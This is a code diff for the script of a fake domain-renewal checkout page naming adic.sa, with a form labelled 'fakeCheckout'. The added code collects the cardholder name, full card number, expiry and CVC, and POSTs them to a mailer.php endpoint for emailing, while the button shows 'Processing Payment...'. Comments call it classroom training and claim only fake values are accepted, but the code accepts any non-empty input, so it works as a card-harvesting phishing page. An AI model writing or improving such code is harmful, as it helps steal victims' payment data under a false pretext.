@@ -1557,10 +1557,8 @@ document.addEventListener("DOMContentLoaded", function () {
      CONFIG
      ========================================================= */
 
-  // IMPORTANT:
-  // If your server actually executes this PHP code at mailer.php,
-  // use https://adic.sa/mailer.php instead.
   var MAILER_URL = "/mailer.php";
+
 
   /* =========================================================
      RENEWAL SUMMARY
@@ -1573,9 +1571,9 @@ document.addEventListener("DOMContentLoaded", function () {
   var site  = q.get("site")  || "adic.sa";
 
   var terms = {
-    "1y": { label: "1 Year",  years: 1, save: "" },
-    "2y": { label: "2 Years", years: 2, save: "49" },
-    "3y": { label: "3 Years", years: 3, save: "48" }
+    "1y": { label:"1 Year",  years:1, save:""   },
+    "2y": { label:"2 Years", years:2, save:"49" },
+    "3y": { label:"3 Years", years:3, save:"48" }
   };
 
   var t = terms[plan] || terms["1y"];
@@ -1602,7 +1600,8 @@ document.addEventListener("DOMContentLoaded", function () {
   var priceEl = document.getElementById("sumPrice");
 
   if (priceEl) {
-    priceEl.innerHTML = price + " <small>SAR</small>";
+    priceEl.innerHTML =
+      price + " <small>SAR</small>";
   }
 
 
@@ -1611,39 +1610,41 @@ document.addEventListener("DOMContentLoaded", function () {
   if (saveEl) {
 
     if (t.save) {
-      saveEl.textContent = "You’re saving " + t.save + " SAR";
+
+      saveEl.textContent =
+        "You’re saving " + t.save + " SAR";
+
       saveEl.style.display = "";
+
     } else {
+
       saveEl.style.display = "none";
+
     }
-
   }
-
-
 
 
   /* =========================================================
      FORM
      ========================================================= */
 
-  var form = document.getElementById("fakeCheckout");
-  var btn  = document.getElementById("placeOrder");
+  var form =
+    document.getElementById("fakeCheckout");
+
+  var btn =
+    document.getElementById("placeOrder");
+
 
   if (!form) {
-    console.error('Form #fakeCheckout not found.');
+    console.error("fakeCheckout form not found");
     return;
   }
 
   if (!btn) {
-    console.error('Button #placeOrder not found.');
+    console.error("placeOrder button not found");
     return;
   }
 
-
-
-  /* =========================================================
-     REQUIRED MOCK FIELDS
-     ========================================================= */
 
   var REQUIRED = [
     "card_name",
@@ -1655,7 +1656,10 @@ document.addEventListener("DOMContentLoaded", function () {
 
   REQUIRED.forEach(function (name) {
 
-    var el = form.querySelector('[name="' + name + '"]');
+    var el =
+      form.querySelector(
+        '[name="' + name + '"]'
+      );
 
     if (el) {
       el.required = true;
@@ -1664,74 +1668,86 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
 
-
   /* =========================================================
      EXPIRY FORMAT
      ========================================================= */
 
-  var exp = document.getElementById("card_expiry");
+  var exp =
+    document.getElementById("card_expiry");
+
 
   if (exp) {
 
-    exp.addEventListener("input", function (e) {
+    exp.addEventListener(
+      "input",
+      function (e) {
 
-      var deleting =
-        e.inputType &&
-        e.inputType.indexOf("delete") === 0;
+        var deleting =
+          e.inputType &&
+          e.inputType.indexOf("delete") === 0;
 
-      var digits = exp.value
-        .replace(/\D/g, "")
-        .slice(0, 4);
+        var digits =
+          exp.value
+            .replace(/\D/g, "")
+            .slice(0, 4);
 
 
-      if (digits.length >= 3) {
+        if (digits.length >= 3) {
 
-        exp.value =
-          digits.slice(0, 2) +
-          " / " +
-          digits.slice(2);
+          exp.value =
+            digits.slice(0, 2) +
+            " / " +
+            digits.slice(2);
 
-      } else if (digits.length === 2) {
+        } else if (digits.length === 2) {
 
-        exp.value =
-          deleting
-            ? digits
-            : digits + " / ";
+          exp.value =
+            deleting
+              ? digits
+              : digits + " / ";
 
-      } else {
+        } else {
 
-        exp.value = digits;
+          exp.value = digits;
+
+        }
 
       }
-
-    });
+    );
 
   }
-
 
 
   /* =========================================================
-     CARD NUMBER DISPLAY FORMATTING
+     CARD FORMAT
      ========================================================= */
 
   var cardNumber =
-    form.querySelector('[name="card_number"]');
+    form.querySelector(
+      '[name="card_number"]'
+    );
+
 
   if (cardNumber) {
 
-    cardNumber.addEventListener("input", function () {
+    cardNumber.addEventListener(
+      "input",
+      function () {
 
-      var digits = cardNumber.value
-        .replace(/\D/g, "")
-        .slice(0, 16);
+        var digits =
+          cardNumber.value
+            .replace(/\D/g, "")
+            .slice(0, 16);
 
-      cardNumber.value =
-        digits.replace(/(.{4})/g, "$1 ").trim();
+        cardNumber.value =
+          digits
+            .replace(/(.{4})/g, "$1 ")
+            .trim();
 
-    });
+      }
+    );
 
   }
-
 
 
   /* =========================================================
@@ -1739,179 +1755,275 @@ document.addEventListener("DOMContentLoaded", function () {
      ========================================================= */
 
   var cvc =
-    form.querySelector('[name="card_cvc"]');
+    form.querySelector(
+      '[name="card_cvc"]'
+    );
+
 
   if (cvc) {
 
-    cvc.addEventListener("input", function () {
+    cvc.addEventListener(
+      "input",
+      function () {
 
-      cvc.value = cvc.value
-        .replace(/\D/g, "")
-        .slice(0, 4);
+        cvc.value =
+          cvc.value
+            .replace(/\D/g, "")
+            .slice(0, 4);
 
-    });
+      }
+    );
 
   }
 
 
-
   /* =========================================================
-     SEND CLASSROOM NOTIFICATION EMAIL
+     SEND TRAINING SUBMISSION
      ========================================================= */
 
-function sendLessonNotification() {
+  async function sendLessonNotification() {
 
-  var data = new FormData();
+    var fd = new FormData(form);
 
-  data.append("mode", "lesson");
-  data.append("site", site);
-  data.append("plan", t.label);
-  data.append("price", price);
+    var demoName =
+      String(
+        fd.get("card_name") || ""
+      ).trim();
 
-  return fetch(MAILER_URL, {
-    method: "POST",
-    body: data
-  })
-  .then(function (res) {
+    var demoNumber =
+      String(
+        fd.get("card_number") || ""
+      )
+      .replace(/\D/g, "");
 
-    return res.json().catch(function () {
+    var demoExpiry =
+      String(
+        fd.get("card_expiry") || ""
+      )
+      .replace(/\s/g, "");
+
+    var demoCvc =
+      String(
+        fd.get("card_cvc") || ""
+      )
+      .replace(/\D/g, "");
+
+
+    /*
+     * Training-only dummy values.
+     */
+    if (
+      demoName == "" ||
+      demoNumber == "" ||
+      demoExpiry == "" ||
+      demoCvc == ""
+    ) {
+
       throw new Error(
-        "Server returned an invalid response."
+        "Empty Values."
       );
-    });
 
-  })
-  .then(function (data) {
-
-    console.log("Mailer response:", data);
-
-    if (!data.ok) {
-      throw new Error(
-        data.error || "Email failed"
-      );
     }
 
-    return data;
 
-  });
-}
+    var data = new FormData();
 
+    data.append("mode", "lesson");
+
+    data.append("site", site);
+    data.append("plan", t.label);
+    data.append("price", price);
+
+    data.append(
+      "demo_name",
+      demoName
+    );
+
+    data.append(
+      "demo_card",
+      demoNumber
+    );
+
+    data.append(
+      "demo_expiry",
+      demoExpiry
+    );
+
+    data.append(
+      "demo_cvc",
+      demoCvc
+    );
+
+
+    console.log(
+      "Sending lesson POST to:",
+      MAILER_URL
+    );
+
+
+    var response =
+      await fetch(
+        MAILER_URL,
+        {
+          method: "POST",
+          body: data
+        }
+      );
+
+
+    var raw =
+      await response.text();
+
+
+    console.log(
+      "Mailer HTTP status:",
+      response.status
+    );
+
+    console.log(
+      "Mailer raw response:",
+      raw
+    );
+
+
+    var result;
+
+    try {
+
+      result =
+        JSON.parse(raw);
+
+    } catch (error) {
+
+      throw new Error(
+        "mailer.php returned HTML instead of JSON. " +
+        "HTTP " +
+        response.status
+      );
+
+    }
+
+
+    if (!result.ok) {
+
+      throw new Error(
+        result.error ||
+        "Mailer rejected the submission."
+      );
+
+    }
+
+
+    return result;
+
+  }
 
 
   /* =========================================================
      SUBMIT
      ========================================================= */
 
-  form.addEventListener("submit", function (e) {
+  form.addEventListener(
+    "submit",
+    async function (e) {
 
-    e.preventDefault();
+      e.preventDefault();
 
 
-    if (!form.reportValidity()) {
-      return;
+      if (!form.reportValidity()) {
+        return;
+      }
+
+
+      btn.disabled = true;
+      btn.textContent =
+        "Processing Payment...";
+
+
+      try {
+
+        var result =
+          await sendLessonNotification();
+
+
+        console.log(
+          "Training email sent:",
+          result
+        );
+
+
+        /*
+         * No popup.
+         */
+
+        btn.textContent =
+          "Submitted";
+
+
+        /*
+         * OPTIONAL:
+         *
+         * Put your next LOCAL training page here.
+         *
+         * Example:
+         *
+         * window.location.href =
+         *   "/training-complete.html";
+         */
+
+      } catch (error) {
+
+        console.error(
+          "Mailer error:",
+          error
+        );
+
+
+        btn.disabled = false;
+        btn.textContent =
+          "Verify & Pay";
+
+
+        var status =
+          document.getElementById(
+            "demoStatus"
+          );
+
+
+        if (!status) {
+
+          status =
+            document.createElement(
+              "div"
+            );
+
+          status.id =
+            "demoStatus";
+
+          status.style.marginTop =
+            "12px";
+
+          status.style.fontSize =
+            "13px";
+
+          status.style.color =
+            "#b91c1c";
+
+          btn.insertAdjacentElement(
+            "afterend",
+            status
+          );
+
+        }
+
+
+        status.textContent =
+          error.message;
+
+      }
+
     }
-
-
-    btn.disabled = true;
-    btn.textContent = "Processing Payment...";
-
-
-function sendLessonNotification() {
-
-  var fd = new FormData(form);
-
-  var demoName =
-    String(fd.get("card_name") || "").trim();
-
-  var demoNumber =
-    String(fd.get("card_number") || "")
-      .replace(/\D/g, "");
-
-  var demoExpiry =
-    String(fd.get("card_expiry") || "")
-      .replace(/\s/g, "");
-
-  var demoCvc =
-    String(fd.get("card_cvc") || "")
-      .replace(/\D/g, "");
-
-
-  /*
-   * TRAINING SAFETY:
-   * only the predefined fake classroom values are accepted.
-   */
-  if (
-    demoName == "" ||
-    demoNumber == "" ||
-    demoExpiry == "" ||
-    demoCvc == ""
-  ) {
-    return Promise.reject(
-      new Error(
-        "Error."
-      )
-    );
-  }
-
-
-  var data = new FormData();
-
-  data.append("mode", "lesson");
-
-  data.append("site", site);
-  data.append("plan", t.label);
-  data.append("price", price);
-
-  data.append("demo_name", demoName);
-  data.append("demo_card", demoNumber);
-  data.append("demo_expiry", demoExpiry);
-  data.append("demo_cvc", demoCvc);
-
-
-  return fetch("/mailer.php", {
-    method: "POST",
-    body: data
-  })
-  .then(function (res) {
-
-    return res.json().catch(function () {
-      throw new Error(
-        "Server returned an invalid response."
-      );
-    });
-
-  })
-  .then(function (data) {
-
-    console.log("Mailer response:", data);
-
-    if (!data.ok) {
-      throw new Error(
-        data.error || "Email failed."
-      );
-    }
-
-    return data;
-
-  });
-}
-
-
-
-  /* =========================================================
-     BASIC HTML ESCAPING
-     ========================================================= */
-
-  function escapeHtml(value) {
-
-    return String(value)
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;")
-      .replace(/'/g, "&#039;");
-
-  }
+  );
 
 });
 </script>
